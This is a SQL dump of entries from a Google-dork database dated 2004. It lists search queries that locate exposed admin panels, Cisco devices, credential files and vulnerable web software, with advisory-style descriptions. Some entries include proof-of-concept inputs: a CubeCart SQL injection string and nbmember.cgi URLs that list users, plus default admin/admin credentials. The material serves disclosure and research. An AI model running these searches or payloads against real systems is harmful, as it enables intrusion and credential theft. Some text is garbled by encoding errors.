(594, '"Powered by CubeCart"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=%22Powered+by+CubeCart%22&btnG=Search', 850, '2004-10-19', '--------------------------------------------------------Full path disclosure and sql injection on CubeCart 2.0.1--------------------------------------------------------[1]Introduction[2]The Problem[3]The Solution[4]Timeline[5]Feddback##############################################################[1]Introduction"CubeCart is an eCommerce script written with PHP &amp; MySQL. With CubeCart you can setup a powerful online store as long as youhave hosting supporting PHP and one MySQL database."This info was taken from hxxp://www.cubecart.comCubeCart, from Brooky (hxxp://www.brooky.com), is a software formerly known as eStore.[2]The ProblemA remote user can cause an error in index.php using the parameter ''cat_id'' which is not properly validated, displaying thesoftware''s full installation path. It can also be used to inject sql commands. Examples follow:(a) http://example.com/store/index.php?cat_id=''causes an error like this:"Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in/home/example/public_html/store/link_navi.php on line 35Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in/home/example/public_html/store/index.php on line 170Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in/home/example/public_html/store/index.php on line 172"(b) http://example.com/store/index.php?cat_id=1 or 1=1--displays all categories in the database[3]The SolutionNone at this time.Vendor contacted and fix will be avaliable soon.[4]Timeline(2/10/2004) Vulnerability discovered(2/10/2004) Vendor notified(3/10/2004) Vendor response[5]FeedbackComments and stuff to cybercide@megamail.pt', '2004-10-19', NULL, NULL),
(595, 'inurl:confixx inurl:login|anmeldung', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&newwindow=1&q=inurl%3Aconfixx+inurl%3Alogin%7Canmeldung&btnG=Search', 1078, '2004-10-19', 'Confixx is a webhosting management tool and has the following features: * create resellers, * edit personal data, * manage newsletters to resellers, * comprehensive stats, * powerful evaluation of traffic, * manage e-mail templates, * lock resellers. security focus has a vulnerability report on this.vendor: http://www.sw-soft.com/en/products/confixx/', '2004-10-19', NULL, NULL),
(597, 'intitle:"Virtual Server Administration System"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&newwindow=1&q=intitle%3A%22Virtual+Server+Administration+System%22', 1197, '2004-10-19', 'VISAS, German control panel software like confixx.No vulnerabilities are reported to security focus.', '2004-10-19', NULL, NULL),
(598, '"SysCP - login"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&newwindow=1&q=%22SysCP+-+login%22', 1304, '2004-10-19', 'sysCP: Open Source server management tool for Debian LinuxNo vulnerabilities are reported to security focus.', '2004-10-19', NULL, NULL),
(599, 'intitle:"ISPMan : Unauthorized Access prohibited"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&newwindow=1&q=intitle%3A%22ISPMan+%3A+Unauthorized+Access+prohibited%22&btnG=Search', 1147, '2004-10-19', 'ISPMan is a distributed system to manage components of ISP from a central management interface.No vulnerabilities are reported to security focus.', '2004-10-19', NULL, NULL),
(600, '"Login - Sun Cobalt RaQ"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&newwindow=1&q=%22Login+-+Sun+Cobalt+RaQ%22', 1135, '2004-10-19', 'The famous Sun linux appliance. Nice clean portal search.Various vulnerabilities are reported to security focus.', '2004-10-19', NULL, NULL),
(601, '"OPENSRS Domain Management" inurl:manage.cgi', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&newwindow=1&q=%22OPENSRS+Domain+Management%22+inurl%3Amanage.cgi', 1183, '2004-10-19', 'OpenSRS Domain Management SystemNo vulnerabilities are reported to security focus.', '2004-10-19', NULL, NULL);
INSERT INTO `dorks` (`dork_id`, `title`, `link`, `hits`, `date`, `description`, `dateSubmission`, `vulnSoftVersion`, `exploitID`) VALUES
(602, 'intitle:plesk inurl:login.php3', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&newwindow=1&q=intitle%3Aplesk+inurl%3Alogin.php3', 1298, '2004-10-20', 'Plesk is server management software developed for the Hosting Service Industry. Various vulnerabilities are reported to security focus.', '2004-10-20', NULL, NULL),
(603, 'inurl:"level/15/exec/-/show"', 'http://www.google.com/search?q=inurl:%22level/15/exec/-/show%22&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 2107, '2004-10-20', 'This search finds Cisco devices which have level 15 access open via webinterface. If an attacker wants to search for another level he can replace the "15" with this level. Levels below 10 need a leading zero (e.g. 04).Currently only the cached pages can be viewed.', '2004-10-20', NULL, NULL),
(604, 'inurl:/dana-na/auth/welcome.html', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=inurl%3A%2Fdana-na%2Fauth%2Fwelcome.html&btnG=Search&X=1&filter=0', 1608, '2004-10-20', 'Neoteris Instant Virtual Extranet (IVE) has been reported prone to a cross-site scripting vulnerability.The issue presents itself, due to a lack of sufficient sanitization performed on an argument passed to an IVE CGI script. An attacker may exploit this vulnerability to hijack valid Neoteris IVE sessions.advisories: http://secunia.com/product/1558/http://www.securityfocus.com/bid/7510', '2004-10-20', NULL, NULL),
(605, 'ext:nsf nsf -gov -mil', 'http://www.google.com/search?hl=en&q=ext%3Ansf+nsf+-gov+-mil', 1340, '2004-10-20', 'Domino is server technology which transforms Lotus NotesÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â® into an Internet applications server. Domino brings together the open networking environment of Internet standards and protocols with the powerful application development facilities of Notes, providing you with the ability to rapidly develop a broad range of business applications for the Internet and Intranet.This is a generic search for Lotus Domino files. It identifies Domino users. Search the GBDB for more variations on this theme.', '2004-10-20', NULL, NULL),
(606, 'inurl:statrep.nsf -gov', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=inurl%3Astatrep.nsf+-gov', 1304, '2004-10-20', 'Domino is server technology which transforms Lotus NotesÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â® into an Internet applications server. Domino brings together the open networking environment of Internet standards and protocols with the powerful application development facilities of Notes, providing you with the ability to rapidly develop a broad range of business applications for the Internet and Intranet. This search finds statistics pages generated by Domino. Information on these pages includes Operating System, Disk space, Usernames and full path disclosure.Example:    * 1. Statistics Reports - 1. System    * 1. Statistics Reports - 2. Mail &amp; Database    * 1. Statistics Reports - 3. Communications    * 1. Statistics Reports - 4. Network    * 1. Statistics Reports - 5. Clusters    * 1. Statistics Reports - 6. Web Server &amp; Retriever    * 1. Statistics Reports - 7. Calendaring Scheduling    * 2. Alarms    * 3. Events    * 4. Spreadsheet Export    * 5. Graphs - 1. System Statistics    * 5. Graphs - 2. System Loads    * 5. Graphs - 3. System Resources    * 6. Trouble Tickets - 1. Alarm    * 6. Trouble Tickets - 2. Event    * 7. Analysis Report    * 8. File Statistics    * 9. Single Copy Object Store Statistics', '2004-10-20', NULL, NULL),
(607, 'inurl:log.nsf -gov', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=inurl%3Alog.nsf+-gov', 1794, '2004-10-20', 'Domino is server technology which transforms Lotus NotesÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â® into an Internet applications server. Domino brings together the open networking environment of Internet standards and protocols with the powerful application development facilities of Notes, providing you with the ability to rapidly develop a broad range of business applications for the Internet and Intranet. This search finds Domino log files. These can be revealing, including information about dbconnect.nsf files, path information, etc.Example:    * Database-Sizes    * Database-Usage    * Mail Routing Events    * Miscellaneous Events    * NNTP Events    * Object Store Usage    * Passthru Connections    * Phone Calls-By Date    * Phone Calls-By User    * Replication Events    * Sample Billing    * Usage-By Date    * Usage-By UserExample:2004/04/14 07:51:00 AM ATTEMPT TO ACCESS DATABASE mtstore.ntf by itisdom/ITIS/ITRI was denied', '2004-10-20', NULL, NULL),
(608, 'inurl:login.php "SquirrelMail version"', 'http://www.google.com/search?hl=en&lr=&client=firefox-a&q=inurl%3Alogin.php+%22SquirrelMail+version%22&btnG=Search', 1749, '2004-10-20', 'squirrelMail is a standards-based webmail package written in PHP4. It includes built-in pure PHP support for the IMAP and SMTP protocols, and all pages render in pure HTML 4.0 (with no JavaScript required) for maximum compatibility across browsers. It has very few requirements and is very easy to configure and install. SquirrelMail has all the functionality you would want from an email client, including strong MIME support, address books, and folder manipulation.', '2004-10-20', NULL, NULL),
(609, '"Ideal BB Version: 0.1" -idealbb.com', 'http://www.google.com/search?hl=en&ie=ISO-8859-1&q=%22Ideal+BB+Version%3A+0.1%22+-idealbb.com&btnG=Google-Suche&meta=', 796, '2004-10-21', 'Ideal BB has been a popular choice for powering web based bulletin boards and we are now proud to introduce our next generation bulletin board Ideal BB.NET. Ideal Science IdealBB is reported prone to multiple unspecified input validation vulnerabilities. These issues result from insufficient sanitization of user-supplied data. Securityfocus currently has 3 reports idealBB.', '2004-10-21', NULL, NULL),
(611, '"Powered by YaPig V0.92b"', 'http://www.google.com/search?hl=en&q=%22Powered+by+YaPig+V0.92b%22&btnG=Google+Search', 2316, '2004-10-22', 'YaPiG is reported to contain an HTML injection vulnerability. The problem is reported to present itself due to a lack of sanitization performed on certain field data.This may allow an attacker to inject malicious HTML and script code into the application.http://www.securityfocus.com/bid/11452', '2004-10-22', NULL, NULL),
(612, 'intitle:"toshiba network camera - User Login"', 'http://www.google.com/search?hl=en&ie=ISO-8859-1&q=intitle%3A%22toshiba+network+camera+-+User+Login%22&btnG=Suche&meta=', 3476, '2004-10-25', 'Web interface of Toshiba network cameras.', '2004-10-25', NULL, NULL),
(613, 'inurl:"/site/articles.asp?idcategory="', 'http://www.google.com/search?hl=en&ie=ISO-8859-1&q=inurl%3A%22%2Fsite%2Farticles.asp%3Fidcategory%3D%22+&btnG=Google-Suche&meta=', 868, '2004-10-25', 'Dwc_Articles is an ASP application designed to add Featured,  Recent and Popular News through an easy to use administration area.  Other features: Design Packages, Add, Modify, Deactive through HTML/Wysiwyg Editor,  Nearly all scripts suffer from possible sql injections. http://www.securityfocus.com/bid/11509', '2004-10-25', NULL, NULL),
(615, 'intitle:"phpremoteview" filetype:php "Name, Size, Type, Modify"', 'http://www.google.com/search?q=intitle%3A%22phpremoteview%22+filetype%3Aphp+%22Name%2C+Size%2C+Type%2C+Modify%22', 2027, '2004-10-26', 'phpRemoteView is webbased filemanger with a basic shell. With this an attacker can browse the server filesystem use the online php interpreter.vendor: http://php.spb.ru/remview/ (russian)', '2004-10-26', NULL, NULL),
(617, 'intitle:"Index of" upload size parent directory', 'http://www.google.com/search?num=100&q=intitle%3A%22Index+of%22+upload+size+parent+directory', 2296, '2004-10-24', 'Files uploaded through ftp by other people, sometimes you can find all sorts of things from movies to important stuff.', '2004-10-24', NULL, NULL),
(618, 'filetype:cgi inurl:nbmember.cgi', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=filetype%3Acgi+inurl%3Anbmember.cgi&btnG=Search', 903, '2004-10-26', 'vulnerable Netbilling nbmember.cgiNetbilling ''nbmember.cgi'' script is reported prone to an information disclosure vulnerability. This issue may allow remote attackers to gain access to user authentication credentials and potentially sensitive configuration information.The following proof of concept is available:http://www.example.com/cgi-bin/nbmember.cgi?cmd=testhttp://www.example.com/cgi-bin/nbmember.cgi?cmd=list_all_users&amp;keyword=hereistheaccesskeywordhttp://www.securityfocus.com/bid/11504', '2004-10-26', NULL, NULL),
(619, '"Powered by Coppermine Photo Gallery"', 'http://www.google.com/search?hl=en&q=%22Powered+by+Coppermine+Photo+Gallery%22+&btnG=Google+Search', 904, '2004-10-26', 'published Oct 20, 2004, updated Oct 20, 2004vulnerable:Coppermine Photo Gallery Coppermine Photo Gallery 1.0Coppermine Photo Gallery Coppermine Photo Gallery 1.1Coppermine Photo Gallery Coppermine Photo Gallery 1.2Coppermine Photo Gallery Coppermine Photo Gallery 1.2.1Coppermine Photo Gallery Coppermine Photo Gallery 1.3Coppermine Photo Gallery Coppermine Photo Gallery 1.3.1Coppermine Photo Gallery Coppermine Photo Gallery 1.3.2Coppermine Photo Gallery is reported prone to a design error that may allow users to cast multiple votes for a picture.All versions of Coppermine Photo Gallery are considered vulnerable at the moment.http://www.securityfocus.com/bid/11485', '2004-10-26', NULL, NULL),
(620, '"Powered by WowBB" -site:wowbb.com', 'http://www.google.com/search?hl=en&q=%22Powered+by+WowBB%22+-site%3Awowbb.com+&btnG=Google+Search', 1218, '2004-10-26', 'WowBB is reportedly affected by multiple input validation vulnerabilities. These issues are due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamic web content and SQL database queries.An attacker can leverage these issues to manipulate or reveal database contents through SQL injection attacks as well as carry out other attacks and steal cookie-based authentication credentials through cross-site scripting attacks.http://www.securityfocus.com/bid/11429http://www.wowbb.com/', '2004-10-26', NULL, NULL),
(621, '"Powered by ocPortal" -demo -ocportal.com', 'http://www.google.com/search?hl=en&q=%22Powered+by+ocPortal%22+-demo+-ocportal.com+&btnG=Google+Search', 833, '2004-10-26', 'Reportedly ocPortal is affected by a remote file include vulnerability. This issue is due to a failure of the application to sanitize user supplied URI input.An attacker might leverage this issue to run arbitrary server side script code on a vulnerable computer with the privileges of the web server process. This may potentially result in a compromise of the vulnerable computer as well as other attacks.http://www.securityfocus.com/bid/11368', '2004-10-26', NULL, NULL),
(622, 'inurl:"slxweb.dll"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=inurl%3A%22slxweb.dll%22+&btnG=Search', 839, '2004-10-26', 'salesLogix is the Customer Relationship Management solution thatdrives  sales performance in small to medium-sized businesses through Sales, Marketing, and Customer Support automation and back-office integration.The problem:By manipulating the cookies used by the Web Client, it is possible totrick the  server into authenticating a remote user as the CRM administrator without requiring a password.  It is also possible to perform SQL injection attacks on the SQL serverthat is used as the data store for the SalesLogix CRM system, reveal detailed error reports contained in HTTP headers and disclose the real filesystem paths to various SalesLogix directories. The SalesLogix server itself is vulnerable to an attack that wouldallow a malicious user to obtain the username and password used to access the SQL server used as a data store. The disclosed username and password always have read/write permissions on the database. Another vulnerability in the SalesLogix server allows anunauthenticated user to upload arbitrary files to the server in any directory (s)he chooses.http://www.securityfocus.com/bid/11450', '2004-10-26', NULL, NULL),
(623, '"Powered by DMXReady Site Chassis Manager" -site:dmxready.com', 'http://www.google.com/search?hl=en&q=%22Powered+by+DMXReady+Site+Chassis+Manager%22+-site%3Admxready.com&btnG=Google+Search', 800, '2004-10-26', 'It is reported that DMXReady Site Chassis Manager is susceptible to two remotely exploitable input validation vulnerabilities. These vulnerabilities are due to a failure of the application to properly sanitize user-supplied data.The first issue is an unspecified cross-site scripting vulnerability. This issue could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were to be followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.The second issue is an unspecified SQL injection vulnerability. It may be possible for a remote user to inject arbitrary SQL queries into the underlying database used by the application. This could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.Successful exploitation could result in compromise of the application, disclosure or modification of data or may permit an attacker to exploit vulnerabilities in the underlying database implementation.', '2004-10-26', NULL, NULL),
(624, '"Powered by My Blog" intext:"FuzzyMonkey.org"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=%22Powered+by+My+Blog%22+intext%3A%22FuzzyMonkey.org%22&btnG=Search', 837, '2004-10-26', 'FuzzyMonkey My Blog is vulnerable to multiple input validation vulnerabilities. These issues are caused by a failure to validate and filter user-supplied strings before including them in dynamic Web page content.An attacker could leverage these issues to carry out cross-site scripting attacks against unsuspecting users, facilitating theft of cookie-based authentication credentials as well as other attacks.vulnerable FuzzyMonkey My Blog 1.15FuzzyMonkey My Blog 1.16FuzzyMonkey My Blog 1.17FuzzyMonkey My Blog 1.18FuzzyMonkey My Blog 1.19FuzzyMonkey My Blog 1.20not vulnerable FuzzyMonkey My Blog 1.21 They also have several other scripts, which may or may not be vulnerable. But remember Murphy''s law also applies to software writers.# My Photo Gallery (picture and file sharing software)# My Calendar (quick and easy web calendar)# My Voting Script# My Guestbookhttp://www.securityfocus.com/bid/11325', '2004-10-26', NULL, NULL),
(625, 'inurl:wiki/MediaWiki', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=inurl%3Awiki%2FMediaWiki&btnG=Search', 1408, '2004-10-26', 'MediaWiki is reported prone to a cross-site scripting vulnerability. This issue arises due to insufficient sanitization of user-supplied data. A remote attacker may exploit this vulnerability to execute arbitrary HTML and script code in the browser of a vulnerable user.bugtraq id 11480objectclass Input Validation Errorcve CVE-MAP-NOMATCHremote Yeslocal Nopublished Oct 18, 2004updated Oct 20, 2004vulnerable MediaWiki MediaWiki 1.3MediaWiki MediaWiki 1.3.1MediaWiki MediaWiki 1.3.2MediaWiki MediaWiki 1.3.3MediaWiki MediaWiki 1.3.4MediaWiki MediaWiki 1.3.5MediaWiki MediaWiki 1.3.6not vulnerable MediaWiki MediaWiki 1.3.7', '2004-10-26', NULL, NULL),
(626, '"inurl:/site/articles.asp?idcategory="', 'http://www.google.com/search?hl=en&q=%22inurl%3A%2Fsite%2Farticles.asp%3Fidcategory%3D%22+&btnG=Google+Search', 1051, '2004-10-26', 'Dwc_Articles, is an ASP application designed to add Featured, Recent and Popular News through an easy to use administration area. Other features: Design Packages, Add, Modify, Deactive through HTML/Wysiwyg Editor, Upload, categories, Multiple Users and more.Nearly all scripts suffer from possible sql injections. This may lead an attacker to change websites content or even worse, a login as an admin.vulnerable:', '2004-10-26', NULL, NULL),
(627, '"Enter ip" inurl:"php-ping.php"', 'http://www.google.com/search?hl=en&lr=&c2coff=1&client=firefox-a&q=%22Enter+ip%22+inurl%3A%22php-ping.php%22&btnG=Search', 880, '2004-10-26', 'It has been reported that php-ping may be prone to a remote command execution vulnerability that may allow remote attackers to execute commands on vulnerable systems. The problem exists due to insufficient sanitization of shellmetacharacters via the ''count'' parameter of php-ping.php script.report: http://www.securityfocus.com/bid/9309/info/sample: http://img64.exs.cx/my.php?loc=img64&amp;image=phpping.jpg', '2004-10-26', NULL, NULL),
(629, 'inurl:click.php intext:PHPClickLog', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=inurl%3Aclick.php+intext%3APHPClickLog+%0D%0A&btnG=Search', 1481, '2004-10-27', 'A script written in PHP 4 which logs a user''s statistics when they click on a link.  The log is stored in a flatfile (text) database and can be viewed/inspected through an administration section.', '2004-10-27', NULL, NULL),
(630, 'intitle:welcome.to.horde', 'http://www.google.com/search?q=intitle:welcome.to.horde&hl=en&lr=&filter=0', 872, '2004-10-27', 'Horde Mail is web based email software, great for checking messages on the road. Several vulnerabilities were reported to Security Focus.', '2004-10-27', NULL, NULL),
(631, '"BlackBoard 1.5.1-f | ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â© 2003-4 by Yves Goergen"', 'http://www.google.com/search?q=%22BlackBoard+1.5.1-f+%7C+%C2%A9+2003-4+by+Yves+Goergen%22&hl=en&lr=&filter=0', 994, '2004-10-27', 'bugtraq id 11336objectclass Input Validation Errorcve CVE-MAP-NOMATCHremote Yeslocal Nopublished Oct 06, 2004updated Oct 06, 2004vulnerable BlackBoard Internet Newsboard System BlackBoard Internet Newsboard System 1.5.1BlackBoard Internet Newsboard System is reported prone to a remote file include vulnerability. This issue presents itself because the application fails to sanitize user-supplied data properly. This issue may allow an attacker to include malicious files containing arbitrary script code to be executed on a vulnerable computer.BlackBoard Internet Newsboard System version 1.5.1 is reported prone to this vulnerability. It is possible that prior versions are affected as well.', '2004-10-27', NULL, NULL),
(632, 'intitle:"AppServ Open Project" -site:www.appservnetwork.com', 'http://www.google.com/search?hl=en&lr=&c2coff=1&client=firefox-a&q=intitle%3A%22AppServ+Open+Project%22+-site%3Awww.appservnetwork.com&btnG=Search', 1549, '2004-10-31', 'AppServ is the Apache/PHP/MySQL open source software installer packages. This normally includes convenient links to phpMyAdmin and phpInfo() pages.', '2004-10-31', NULL, NULL),
(635, 'intitle:"php icalendar administration" -site:sourceforge.net', 'http://www.google.com/search?q=intitle%3A%22php+icalendar+administration%22+-site%3Asourceforge.net', 1128, '2004-10-31', 'PHP iCalendar is a php-based iCal file parser. Its based on v2.0 of the IETF spec. It displays iCal files in a nice logical, clean manner with day, week, month, and year navigation.This reveals the administration interface.', '2004-10-31', NULL, NULL),
(636, 'intitle:"Web Server Statistics for ****"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=intitle%3A%22Web+Server+Statistics+for+****%22&btnG=Search', 1340, '2004-10-31', 'These are www analog webstat reports. The failure report shows information leakage about database drivers, admin login pages,  SQL statements, etc.', '2004-10-31', NULL, NULL),
(637, 'filetype:php inurl:index inurl:phpicalendar -site:sourceforge.net', 'http://www.google.com/search?num=100&&q=filetype%3Aphp+inurl%3Aindex+inurl%3Aphpicalendar+-site%3Asourceforge.net', 1340, '2004-10-31', 'PHP iCalendar is a php-based iCal file parser. Its based on v2.0 of the IETF spec. It displays iCal files in a nice logical, clean manner with day, week, month, and year navigationThis reveals the RSS info for the user calendars.', '2004-10-31', NULL, NULL),
(638, 'intitle:"php icalendar administration" -site:sourceforge.net', 'http://www.google.com/search?q=intitle%3A%22php+icalendar+administration%22+-site%3Asourceforge.net', 1156, '2004-10-31', 'This is the adminstration login portal search for PHP iCalendar. It is compatible with Evolution and clients for other platforms. Admin uuthentication has two choices, FTP and Internal. For the latter the defaults are "admin/admin".There is also a more generic search in the GHDB that an attacker use and then modify to ../admin.php to reach the adminstration pages. Access to adminstration allows an attacker to upload new ICS files or delete present ones.', '2004-10-31', NULL, NULL),
(639, 'intitle:phpMyAdmin "Welcome to phpMyAdmin ***" "running on * as root@*"', 'http://www.google.com/search?q=intitle%3AphpMyAdmin+%22Welcome+to+phpMyAdmin+***%22+%22running+on+*+as+root%40*%22&start=0', 8886, '2004-10-31', 'phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the Web. Currently it can create and drop databases, create/drop/alter tables, delete/edit/add fieldsThe servers found here can be acessed without authentication. This search is restricted to NON-ROOT users! See ID 510 for a root user search.', '2004-10-31', NULL, NULL),
(641, 'inurl:irc filetype:cgi cgi:irc', 'http://www.google.com/search?num=100&q=inurl%3Airc+filetype%3Acgi+cgi%3Airc', 1233, '2004-11-04', 'CGIIRC is a web-based IRC client. Using a non-transparent proxy an attacker could communicate anonymously by sending direct messages to a contact. Most servers are restricted to one irc server and one or more default channels and will not let allow access to anything else.', '2004-11-04', NULL, NULL),
(643, 'filetype:inf inurl:capolicy.inf', 'http://www.google.com/search?q=filetype%3Ainf+inurl%3Acapolicy.inf&start=0&start=0&ie=utf-8&oe=utf-8&client=firefox&rls=org.mozilla:en-US:official', 1249, '2004-11-05', 'The CAPolicy.inf file provides Certificate Servicces configuration information, which is read during initial CA installation an whenever you renew a CA certificate. The CApolicy.inf file defines settings specific to root CAs, as well as settings that affect all CAs in the CA hierarchiy.', '2004-11-05', NULL, NULL),
(644, '"Certificate Practice Statement" inurl:(PDF | DOC)', 'http://www.google.com/search?hl=en&lr=&safe=off&q=%22Certificate+Practice+Statement%22+inurl%3A%28PDF+%7C+DOC%29&btnG=Search', 1276, '2004-11-05', 'Certificate Practice Statement  (CPS)A CPS defines the measures taken to secure CA operation and the management of CA-issued certificates. You can consider a CPS to be an agreement between the organization managing the CA and the people relying on on the certificates issued by the CA.', '2004-11-05', NULL, NULL),
(645, 'filetype:cgi inurl:cachemgr.cgi', 'http://www.google.com/search?hl=en&q=filetype%3Acgi+inurl%3Acachemgr.cgi', 1590, '2004-11-04', 'cachemgr.cgi is a management interface for the Squid proxy service. It was installed by default in /cgi-bin by RedHat Linux 5.2 and 6.0 installed with Squid. This script prompts for a host and port which it then attempts to connect to. If a web server, such as apache, is running this can be used to connect to arbitrary hosts and ports, allowing for potential use as an intermediary in denial of service attacks, proxied port scans, etc. Interpreting the output of the script can allow the attacker to determine whether or not a connection was established.', '2004-11-04', NULL, NULL),
(646, 'inurl:chap-secrets -cvs', 'http://www.google.com/search?hl=en&q=inurl%3Achap-secrets+-cvs+&btnG=Suche&meta=', 1562, '2004-11-06', 'linux vpns store their usernames and passwords for CHAP authentification in a file called "chap-secrets" where the usernames and the passwords are in cleartext.', '2004-11-06', NULL, NULL),
(647, 'inurl:pap-secrets -cvs', 'http://www.google.com/search?hl=en&lr=&q=inurl%3Apap-secrets+-cvs+&btnG=Search', 1619, '2004-11-06', 'linux vpns store there usernames and passwords for PAP authentification in a file called "pap-secrets" where the usernames and the passwords are in cleartext.', '2004-11-06', NULL, NULL),
(648, 'filetype:ini inurl:"serv-u.ini"', 'http://www.google.com/search?&q=filetype%3Aini+inurl%3A%22serv-u.ini%22', 1664, '2004-11-06', 'serv-U is a ftp/administration server for Windows. This file leaks info about the version, username and password. Passwords are in encrypted, but there is a decryption program available on the Net. An attacker could use this search to upload dangerous code etc.', '2004-11-06', NULL, NULL),
(649, 'inurl:"forumdisplay.php" +"Powered by: vBulletin Version 3.0.0..4"', 'http://www.google.com/search?q=inurl:%22forumdisplay.php%22+%2B%22Powered+by:+vBulletin+Version+3.0.0..4%22+&hl=en&lr=&c2coff=1&client=firefox-a&rls=org.mozilla:en-US:official&start=80&sa=N', 1812, '2004-11-05', 'vBulletin is reported vulnerable to a remote SQL injection vulnerability. This issue is due to a failure of the application to properly validate user-supplied input prior to including it in an SQL query. An attacker may exploit this issue to manipulate and inject SQL queries onto the underlying database. It will be possible to leverage this issue to steal database contents including administrator password hashes and user credentials as well as to make attacks against the underlying database. Versions 3.0 through to 3.0.3 are reportedly affected by this issue.http://www.securityfocus.com/bid/11193', '2004-11-05', NULL, NULL),
